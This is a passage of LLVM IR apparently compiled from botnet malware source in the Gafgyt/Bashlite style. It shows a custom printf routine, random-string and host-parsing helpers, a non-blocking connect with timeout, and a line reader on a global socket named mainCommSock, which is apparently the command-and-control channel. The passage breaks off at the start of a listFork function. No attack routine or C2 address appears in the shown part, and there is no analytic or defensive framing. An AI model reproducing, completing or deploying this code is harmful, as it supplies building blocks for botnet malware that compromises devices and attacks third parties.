  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

41:                                               ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

44:                                               ; preds = %41, %36
  br label %45

45:                                               ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

50:                                               ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45, !llvm.loop !15

55:                                               ; preds = %45
  br label %56

56:                                               ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

61:                                               ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

66:                                               ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

68:                                               ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

77:                                               ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56, !llvm.loop !16

80:                                               ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

85:                                               ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

90:                                               ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

96:                                               ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

101:                                              ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

109:                                              ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

111:                                              ; preds = %101
  br label %112

112:                                              ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.46, i64 0, i64 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

119:                                              ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

124:                                              ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

130:                                              ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

136:                                              ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

141:                                              ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

149:                                              ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

154:                                              ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

160:                                              ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

166:                                              ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

171:                                              ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

179:                                              ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

184:                                              ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

190:                                              ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

196:                                              ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

201:                                              ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

209:                                              ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

214:                                              ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

220:                                              ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

226:                                              ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

231:                                              ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

239:                                              ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

244:                                              ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

249:                                              ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

255:                                              ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

260:                                              ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

273:                                              ; preds = %239
  br label %282

274:                                              ; preds = %17
  br label %275

275:                                              ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

282:                                              ; preds = %275, %273
  br label %283

283:                                              ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12, !llvm.loop !17

286:                                              ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

289:                                              ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

292:                                              ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_end(i8*) #6

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getHost(i8* %0, %struct.in_addr* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #11
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

13:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

14:                                               ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @makeRandomStr(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

6:                                                ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

10:                                               ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

19:                                               ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6, !llvm.loop !18

22:                                               ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @recvLine(i32 %0, i8* %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.fd_set*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.fd_set*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %19, i8 0, i64 %21, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

24:                                               ; preds = %3
  store %struct.fd_set* %8, %struct.fd_set** %11, align 8
  store i32 0, i32* %10, align 4
  br label %25

25:                                               ; preds = %35, %24
  %26 = load i32, i32* %10, align 4
  %27 = zext i32 %26 to i64
  %28 = icmp ult i64 %27, 16
  br i1 %28, label %29, label %38

29:                                               ; preds = %25
  %30 = load %struct.fd_set*, %struct.fd_set** %11, align 8
  %31 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %32 = load i32, i32* %10, align 4
  %33 = zext i32 %32 to i64
  %34 = getelementptr inbounds [16 x i64], [16 x i64]* %31, i64 0, i64 %33
  store i64 0, i64* %34, align 8
  br label %35

35:                                               ; preds = %29
  %36 = load i32, i32* %10, align 4
  %37 = add i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %25, !llvm.loop !19

38:                                               ; preds = %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %5, align 4
  %41 = srem i32 %40, 64
  %42 = zext i32 %41 to i64
  %43 = shl i64 1, %42
  %44 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %45 = load i32, i32* %5, align 4
  %46 = sdiv i32 %45, 64
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [16 x i64], [16 x i64]* %44, i64 0, i64 %47
  %49 = load i64, i64* %48, align 8
  %50 = or i64 %49, %43
  store i64 %50, i64* %48, align 8
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, 1
  %53 = call i32 @select(i32 %52, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %53, i32* %12, align 4
  %54 = icmp sle i32 %53, 0
  br i1 %54, label %55, label %98

55:                                               ; preds = %39
  br label %56

56:                                               ; preds = %93, %55
  %57 = load i32, i32* %13, align 4
  %58 = icmp slt i32 %57, 10
  br i1 %58, label %59, label %97

59:                                               ; preds = %56
  %60 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %60, align 8
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %61, align 8
  br label %62

62:                                               ; preds = %59
  store %struct.fd_set* %8, %struct.fd_set** %15, align 8
  store i32 0, i32* %14, align 4
  br label %63

63:                                               ; preds = %73, %62
  %64 = load i32, i32* %14, align 4
  %65 = zext i32 %64 to i64
  %66 = icmp ult i64 %65, 16
  br i1 %66, label %67, label %76

67:                                               ; preds = %63
  %68 = load %struct.fd_set*, %struct.fd_set** %15, align 8
  %69 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %68, i32 0, i32 0
  %70 = load i32, i32* %14, align 4
  %71 = zext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %69, i64 0, i64 %71
  store i64 0, i64* %72, align 8
  br label %73

73:                                               ; preds = %67
  %74 = load i32, i32* %14, align 4
  %75 = add i32 %74, 1
  store i32 %75, i32* %14, align 4
  br label %63, !llvm.loop !20

76:                                               ; preds = %63
  br label %77

77:                                               ; preds = %76
  %78 = load i32, i32* %5, align 4
  %79 = srem i32 %78, 64
  %80 = zext i32 %79 to i64
  %81 = shl i64 1, %80
  %82 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %83 = load i32, i32* %5, align 4
  %84 = sdiv i32 %83, 64
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds [16 x i64], [16 x i64]* %82, i64 0, i64 %85
  %87 = load i64, i64* %86, align 8
  %88 = or i64 %87, %81
  store i64 %88, i64* %86, align 8
  %89 = load i32, i32* %5, align 4
  %90 = add nsw i32 %89, 1
  %91 = call i32 @select(i32 %90, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %91, i32* %12, align 4
  %92 = icmp sle i32 %91, 0
  br i1 %92, label %93, label %96

93:                                               ; preds = %77
  %94 = load i32, i32* %13, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %13, align 4
  br label %56, !llvm.loop !21

96:                                               ; preds = %77
  br label %97

97:                                               ; preds = %96, %56
  br label %98

98:                                               ; preds = %97, %39
  store i32 0, i32* %18, align 4
  %99 = load i8*, i8** %6, align 8
  store i8* %99, i8** %17, align 8
  br label %100

100:                                              ; preds = %118, %98
  %101 = load i32, i32* %7, align 4
  %102 = add nsw i32 %101, -1
  store i32 %102, i32* %7, align 4
  %103 = icmp sgt i32 %101, 1
  br i1 %103, label %104, label %121

104:                                              ; preds = %100
  %105 = load i32, i32* @mainCommSock, align 4
  %106 = call i64 @recv(i32 %105, i8* %16, i64 1, i32 0)
  %107 = icmp ne i64 %106, 1
  br i1 %107, label %108, label %110

108:                                              ; preds = %104
  %109 = load i8*, i8** %17, align 8
  store i8 0, i8* %109, align 1
  store i32 -1, i32* %4, align 4
  br label %124

110:                                              ; preds = %104
  %111 = load i8, i8* %16, align 1
  %112 = load i8*, i8** %17, align 8
  %113 = getelementptr inbounds i8, i8* %112, i32 1
  store i8* %113, i8** %17, align 8
  store i8 %111, i8* %112, align 1
  %114 = load i8, i8* %16, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 10
  br i1 %116, label %117, label %118

117:                                              ; preds = %110
  br label %121

118:                                              ; preds = %110
  %119 = load i32, i32* %18, align 4
  %120 = add nsw i32 %119, 1
  store i32 %120, i32* %18, align 4
  br label %100, !llvm.loop !22

121:                                              ; preds = %117, %100
  %122 = load i8*, i8** %17, align 8
  store i8 0, i8* %122, align 1
  %123 = load i32, i32* %18, align 4
  store i32 %123, i32* %4, align 4
  br label %124

124:                                              ; preds = %121, %108
  %125 = load i32, i32* %4, align 4
  ret i32 %125
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connectTimeout(i32 %0, i8* %1, i32 %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct.fd_set*, align 8
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %4
  store i32 0, i32* %5, align 4
  br label %106

37:                                               ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %39, i8 0, i64 8, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %97

45:                                               ; preds = %37
  %46 = call i32* @__errno_location() #10
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %95

49:                                               ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

54:                                               ; preds = %49
  store %struct.fd_set* %11, %struct.fd_set** %18, align 8
  store i32 0, i32* %17, align 4
  br label %55

55:                                               ; preds = %65, %54
  %56 = load i32, i32* %17, align 4
  %57 = zext i32 %56 to i64
  %58 = icmp ult i64 %57, 16
  br i1 %58, label %59, label %68

59:                                               ; preds = %55
  %60 = load %struct.fd_set*, %struct.fd_set** %18, align 8
  %61 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %60, i32 0, i32 0
  %62 = load i32, i32* %17, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 %63
  store i64 0, i64* %64, align 8
  br label %65

65:                                               ; preds = %59
  %66 = load i32, i32* %17, align 4
  %67 = add i32 %66, 1
  store i32 %67, i32* %17, align 4
  br label %55, !llvm.loop !23

68:                                               ; preds = %55
  br label %69

69:                                               ; preds = %68
  %70 = load i32, i32* %6, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %75 = load i32, i32* %6, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %6, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %84 = icmp sgt i32 %83, 0
  br i1 %84, label %85, label %93

85:                                               ; preds = %69
  store i32 4, i32* %13, align 4
  %86 = load i32, i32* %6, align 4
  %87 = bitcast i32* %14 to i8*
  %88 = call i32 @getsockopt(i32 %86, i32 1, i32 4, i8* %87, i32* %13) #11
  %89 = load i32, i32* %14, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %91, label %92

91:                                               ; preds = %85
  store i32 0, i32* %5, align 4
  br label %106

92:                                               ; preds = %85
  br label %94

93:                                               ; preds = %69
  store i32 0, i32* %5, align 4
  br label %106

94:                                               ; preds = %92
  br label %96

95:                                               ; preds = %45
  store i32 0, i32* %5, align 4
  br label %106

96:                                               ; preds = %94
  br label %97

97:                                               ; preds = %96, %37
  %98 = load i32, i32* %6, align 4
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %98, i32 3, i8* null)
  %100 = sext i32 %99 to i64
  store i64 %100, i64* %15, align 8
  %101 = load i64, i64* %15, align 8
  %102 = and i64 %101, -2049
  store i64 %102, i64* %15, align 8
  %103 = load i32, i32* %6, align 4
  %104 = load i64, i64* %15, align 8
  %105 = call i32 (i32, i32, ...) @fcntl(i32 %103, i32 4, i64 %104)
  store i32 1, i32* %5, align 4
  br label %106

106:                                              ; preds = %97, %95, %93, %91, %36
  %107 = load i32, i32* %5, align 4
  ret i32 %107
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #1

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
